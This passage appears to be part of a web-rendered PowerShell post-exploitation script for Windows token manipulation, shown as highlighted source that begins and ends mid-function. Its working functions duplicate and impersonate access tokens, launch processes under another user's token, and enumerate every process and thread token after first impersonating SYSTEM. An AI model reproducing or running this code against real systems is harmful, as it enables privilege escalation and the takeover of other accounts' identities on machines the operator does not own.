                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">-notcontains</span> <span class="token variable">$Fullname</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$Fullname</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token variable">$Fullname</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$ReturnDict</span> = @<span class="token punctuation">{</span>
            TokenByUser = <span class="token variable">$TokenByUser</span>
            TokenByEnabledPriv = <span class="token variable">$TokenByEnabledPriv</span>
            TokenByAvailablePriv = <span class="token variable">$TokenByAvailablePriv</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> PSObject <span class="token operator">-</span>Property <span class="token variable">$ReturnDict</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> Invoke<span class="token operator">-</span>ImpersonateUser
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>
            <span class="token namespace">[IntPtr]</span>
            <span class="token variable">$hToken</span>
        <span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true">#Duplicate the token so it can be used to create a new process</span>
        <span class="token namespace">[IntPtr]</span><span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token variable">$Success</span> = <span class="token variable">$DuplicateTokenEx</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> 3<span class="token punctuation">,</span> 1<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#todo does this need to be freed</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token function">Write-Warning</span> <span class="token string">"DuplicateTokenEx failed. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$Success</span> = <span class="token variable">$ImpersonateLoggedOnUser</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$Errorcode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token function">Write-Warning</span> <span class="token string">"Failed to ImpersonateLoggedOnUser. Error code: <span class="token variable">$Errorcode</span>"</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$Success</span> = <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>
        <span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token function">Write-Warning</span> <span class="token string">"CloseHandle failed to close NewHToken. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$Success</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> Create<span class="token operator">-</span>ProcessWithToken
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>
            <span class="token namespace">[IntPtr]</span>
            <span class="token variable">$hToken</span><span class="token punctuation">,</span>

            <span class="token namespace">[Parameter(Position=1, Mandatory=$true)]</span>
            <span class="token namespace">[String]</span>
            <span class="token variable">$ProcessName</span><span class="token punctuation">,</span>

            <span class="token namespace">[Parameter(Position=2)]</span>
            <span class="token namespace">[String]</span>
            <span class="token variable">$ProcessArgs</span><span class="token punctuation">,</span>

            <span class="token namespace">[Parameter(Position=3)]</span>
            <span class="token namespace">[Switch]</span>
            <span class="token variable">$PassThru</span>
        <span class="token punctuation">)</span>
        <span class="token function">Write-Verbose</span> <span class="token string">"Entering Create-ProcessWithToken"</span>
        <span class="token comment" spellcheck="true">#Duplicate the token so it can be used to create a new process</span>
        <span class="token namespace">[IntPtr]</span><span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token variable">$Success</span> = <span class="token variable">$DuplicateTokenEx</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>MAXIMUM_ALLOWED<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> 3<span class="token punctuation">,</span> 1<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token function">Write-Warning</span> <span class="token string">"DuplicateTokenEx failed. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$StartupInfoSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$STARTUPINFO</span><span class="token punctuation">)</span>
            <span class="token namespace">[IntPtr]</span><span class="token variable">$StartupInfoPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$StartupInfoSize</span><span class="token punctuation">)</span>
            <span class="token variable">$memset</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token variable">$StartupInfoSize</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::WriteInt32<span class="token punctuation">(</span><span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> <span class="token variable">$StartupInfoSize</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#The first parameter (cb) is a DWORD which is the size of the struct</span>

            <span class="token variable">$ProcessInfoSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$PROCESS_INFORMATION</span><span class="token punctuation">)</span>
            <span class="token namespace">[IntPtr]</span><span class="token variable">$ProcessInfoPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$ProcessInfoSize</span><span class="token punctuation">)</span>

            <span class="token variable">$ProcessNamePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StringToHGlobalUni<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$ProcessName</span>"</span><span class="token punctuation">)</span>
            <span class="token variable">$ProcessArgsPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token namespace">[String]</span>::IsNullOrEmpty<span class="token punctuation">(</span><span class="token variable">$ProcessArgs</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ProcessArgsPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StringToHGlobalUni<span class="token punctuation">(</span><span class="token string">"`"<span class="token variable">$ProcessName</span>`" <span class="token variable">$ProcessArgs</span>"</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$FunctionName</span> = <span class="token string">""</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token namespace">[System.Diagnostics.Process]</span>::GetCurrentProcess<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>SessionId <span class="token operator">-eq</span> 0<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">#Cannot use CreateProcessWithTokenW when in Session0 because CreateProcessWithTokenW throws an ACCESS_DENIED error. I believe it is because</span>
                <span class="token comment" spellcheck="true">#this API attempts to modify the desktop ACL. I would just use this API all the time, but it requires that I enable SeAssignPrimaryTokenPrivilege</span>
                <span class="token comment" spellcheck="true">#which is not ideal. </span>
                <span class="token function">Write-Verbose</span> <span class="token string">"Running in Session 0. Enabling SeAssignPrimaryTokenPrivilege and calling CreateProcessAsUserW to create a process with alternate token."</span>
                Enable<span class="token operator">-</span>Privilege <span class="token operator">-</span>Privilege SeAssignPrimaryTokenPrivilege
                <span class="token variable">$Success</span> = <span class="token variable">$CreateProcessAsUserW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">,</span> <span class="token variable">$ProcessNamePtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessArgsPtr</span><span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">)</span>
                <span class="token variable">$FunctionName</span> = <span class="token string">"CreateProcessAsUserW"</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Verbose</span> <span class="token string">"Not running in Session 0, calling CreateProcessWithTokenW to create a process with alternate token."</span>
                <span class="token variable">$Success</span> = <span class="token variable">$CreateProcessWithTokenW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">,</span> 0x0<span class="token punctuation">,</span> <span class="token variable">$ProcessNamePtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessArgsPtr</span><span class="token punctuation">,</span> 0<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$StartupInfoPtr</span><span class="token punctuation">,</span> <span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">)</span>
                <span class="token variable">$FunctionName</span> = <span class="token string">"CreateProcessWithTokenW"</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token comment" spellcheck="true">#Free the handles returned in the ProcessInfo structure</span>
                <span class="token variable">$ProcessInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$PROCESS_INFORMATION</span><span class="token punctuation">)</span>
                <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hProcess<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
                <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>hThread<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>

        <span class="token comment" spellcheck="true">#Pass created System.Diagnostics.Process object to pipeline</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PassThru</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">#Retrieving created System.Diagnostics.Process object</span>
            <span class="token variable">$returnProcess</span> = <span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$ProcessInfo</span><span class="token punctuation">.</span>dwProcessId

            <span class="token comment" spellcheck="true">#Caching process handle so we don't lose it when the process exits</span>
            <span class="token variable">$null</span> = <span class="token variable">$returnProcess</span><span class="token punctuation">.</span>Handle

            <span class="token comment" spellcheck="true">#Passing System.Diagnostics.Process object to pipeline</span>
            <span class="token variable">$returnProcess</span>
        <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token function">Write-Warning</span> <span class="token string">"<span class="token variable">$FunctionName</span> failed. Error code: <span class="token variable">$ErrorCode</span>"</span>
            <span class="token punctuation">}</span>

            <span class="token comment" spellcheck="true">#Free StartupInfo memory and ProcessInfo memory</span>
            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$StartupInfoPtr</span><span class="token punctuation">)</span>
            <span class="token variable">$StartupInfoPtr</span> = <span class="token namespace">[Intptr]</span>::Zero
            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$ProcessInfoPtr</span><span class="token punctuation">)</span>
            <span class="token variable">$ProcessInfoPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero
            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::ZeroFreeGlobalAllocUnicode<span class="token punctuation">(</span><span class="token variable">$ProcessNamePtr</span><span class="token punctuation">)</span>
            <span class="token variable">$ProcessNamePtr</span> = <span class="token namespace">[IntPtr]</span>::Zero

            <span class="token comment" spellcheck="true">#Close handle for the token duplicated with DuplicateTokenEx</span>
            <span class="token variable">$Success</span> = <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$NewHToken</span><span class="token punctuation">)</span>
            <span class="token variable">$NewHToken</span> = <span class="token namespace">[IntPtr]</span>::Zero
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token function">Write-Warning</span> <span class="token string">"CloseHandle failed to close NewHToken. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> Free<span class="token operator">-</span>AllTokens
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>
            <span class="token namespace">[PSObject[]</span><span class="token punctuation">]</span>
            <span class="token variable">$TokenInfoObjs</span>
        <span class="token punctuation">)</span>

        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Obj</span> in <span class="token variable">$TokenInfoObjs</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$Success</span> = <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Obj</span><span class="token punctuation">.</span>hToken<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token function">Write-Verbose</span> <span class="token string">"Failed to close token handle in Free-AllTokens. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>
            <span class="token punctuation">}</span>
            <span class="token variable">$Obj</span><span class="token punctuation">.</span>hToken = <span class="token namespace">[IntPtr]</span>::Zero
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


    <span class="token comment" spellcheck="true">#Enumerate all tokens on the system. Returns an array of objects with the token and information about the token.</span>
    <span class="token keyword">function</span> Enum<span class="token operator">-</span>AllTokens
    <span class="token punctuation">{</span>
        <span class="token variable">$AllTokens</span> = @<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true">#First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.</span>
        <span class="token comment" spellcheck="true">#Even if already running as system, later parts on the script depend on having a SYSTEM token with most privileges.</span>
        <span class="token comment" spellcheck="true">#We need to enumrate all processes running as SYSTEM and find one that we can use.</span>
        <span class="token namespace">[string]</span><span class="token variable">$LocalSystemNTAccount</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token operator">-</span>TypeName <span class="token string">'System.Security.Principal.SecurityIdentifier'</span> <span class="token operator">-</span>ArgumentList <span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WellKnownSidType]</span>::<span class="token string">'LocalSystemSid'</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Translate<span class="token punctuation">(</span><span class="token namespace">[Security.Principal.NTAccount]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Value

        <span class="token variable">$SystemTokens</span> = <span class="token function">Get-WmiObject</span> <span class="token operator">-</span><span class="token keyword">Class</span> Win32_Process <span class="token punctuation">|</span> <span class="token function">ForEach-Object</span> <span class="token punctuation">{</span>
            <span class="token variable">$OwnerInfo</span> = <span class="token variable">$_</span><span class="token punctuation">.</span>GetOwner<span class="token punctuation">(</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>Domain <span class="token operator">-and</span> <span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>User<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$OwnerString</span> = <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>Domain<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token variable">$OwnerInfo</span><span class="token punctuation">.</span>User<span class="token punctuation">)</span></span>"</span><span class="token punctuation">.</span>ToUpper<span class="token punctuation">(</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$OwnerString</span> <span class="token operator">-eq</span> <span class="token variable">$LocalSystemNTAccount</span><span class="token punctuation">.</span>ToUpper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$_</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">ForEach</span> <span class="token punctuation">(</span><span class="token variable">$SystemToken</span> in <span class="token variable">$SystemTokens</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$SystemTokenInfo</span> = Get<span class="token operator">-</span>PrimaryToken <span class="token operator">-</span>ProcessId <span class="token variable">$SystemToken</span><span class="token punctuation">.</span>ProcessId <span class="token operator">-</span>WarningAction SilentlyContinue <span class="token operator">-</span>ErrorAction SilentlyContinue
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">break</span> <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span> <span class="token operator">-eq</span> <span class="token variable">$null</span> <span class="token operator">-or</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token punctuation">(</span>Invoke<span class="token operator">-</span>ImpersonateUser <span class="token operator">-</span>hToken <span class="token variable">$systemTokenInfo</span><span class="token punctuation">.</span>hProcToken<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token function">Write-Warning</span> <span class="token string">"Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span> <span class="token operator">-ne</span> <span class="token variable">$null</span> <span class="token operator">-and</span> <span class="token variable">$SystemTokenInfo</span><span class="token punctuation">.</span>hProcToken <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$SystemTokenInfo</span><span class="token punctuation">.</span>hProcToken<span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>
            <span class="token variable">$SystemTokenInfo</span> = <span class="token variable">$null</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$ProcessIds</span> = <span class="token function">get-process</span> <span class="token punctuation">|</span> where <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>name <span class="token operator">-</span>inotmatch <span class="token string">"^csrss$"</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>name <span class="token operator">-</span>inotmatch <span class="token string">"^system$"</span> <span class="token operator">-and</span> <span class="token variable">$_</span><span class="token punctuation">.</span>id <span class="token operator">-ne</span> 0<span class="token punctuation">}</span>

        <span class="token comment" spellcheck="true">#Get all tokens</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Process</span> in <span class="token variable">$ProcessIds</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$PrimaryTokenInfo</span> = <span class="token punctuation">(</span>Get<span class="token operator">-</span>PrimaryToken <span class="token operator">-</span>ProcessId <span class="token variable">$Process</span><span class="token punctuation">.</span>Id <span class="token operator">-</span>FullPrivs<span class="token punctuation">)</span>

            <span class="token comment" spellcheck="true">#If a process is a protected process, it's primary token cannot be obtained. Don't try to enumerate it.</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$PrimaryTokenInfo</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token namespace">[IntPtr]</span><span class="token variable">$hToken</span> = <span class="token namespace">[IntPtr]</span><span class="token variable">$PrimaryTokenInfo</span><span class="token punctuation">.</span>hProcToken

                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">#Get the LUID corrosponding to the logon</span>
                    <span class="token variable">$ReturnObj</span> = Get<span class="token operator">-</span>TokenInformation <span class="token operator">-</span>hToken <span class="token variable">$hToken</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnObj</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name ProcessId <span class="token operator">-</span>Value <span class="token variable">$Process</span><span class="token punctuation">.</span>Id

                        <span class="token variable">$AllTokens</span> <span class="token operator">+=</span> <span class="token variable">$ReturnObj</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">{</span>
                    <span class="token function">Write-Warning</span> <span class="token string">"Couldn't retrieve token for Process:<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Name<span class="token punctuation">)</span></span>. ProcessId:<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$Process</span><span class="token punctuation">.</span>Id<span class="token punctuation">)</span></span>"</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Thread</span> in <span class="token variable">$Process</span><span class="token punctuation">.</span>Threads<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token variable">$ThreadTokenInfo</span> = Get<span class="token operator">-</span>ThreadToken <span class="token operator">-</span>ThreadId <span class="token variable">$Thread</span><span class="token punctuation">.</span>Id
                    <span class="token namespace">[IntPtr]</span><span class="token variable">$hToken</span> = <span class="token punctuation">(</span><span class="token variable">$ThreadTokenInfo</span><span class="token punctuation">.</span>hThreadToken<span class="token punctuation">)</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hToken</span> <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>
                    <span class="token punctuation">{</span>
                        <span class="token variable">$ReturnObj</span> = Get<span class="token operator">-</span>TokenInformation <span class="token operator">-</span>hToken <span class="token variable">$hToken</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnObj</span> <span class="token operator">-ne</span> <span class="token variable">$null</span><span class="token punctuation">)</span>
                        <span class="token punctuation">{</span>
                            <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name ThreadId <span class="token operator">-</span>Value <span class="token variable">$Thread</span><span class="token punctuation">.</span>Id

                            <span class="token variable">$AllTokens</span> <span class="token operator">+=</span> <span class="token variable">$ReturnObj</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token variable">$AllTokens</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">function</span> Invoke<span class="token operator">-</span>RevertToSelf
    <span class="token punctuation">{</span>
        <span class="token keyword">Param</span><span class="token punctuation">(</span>
            <span class="token namespace">[Parameter(Position=0)]</span>
            <span class="token namespace">[Switch]</span>
            <span class="token variable">$ShowOutput</span>
        <span class="token punctuation">)</span>

        <span class="token variable">$Success</span> = <span class="token variable">$RevertToSelf</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ShowOutput</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token function">Write-Output</span> <span class="token string">"RevertToSelf was successful. Running as:<span class="token function"> $<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserDomainName<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token namespace">[Environment]</span>::UserName<span class="token punctuation">)</span></span>"</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
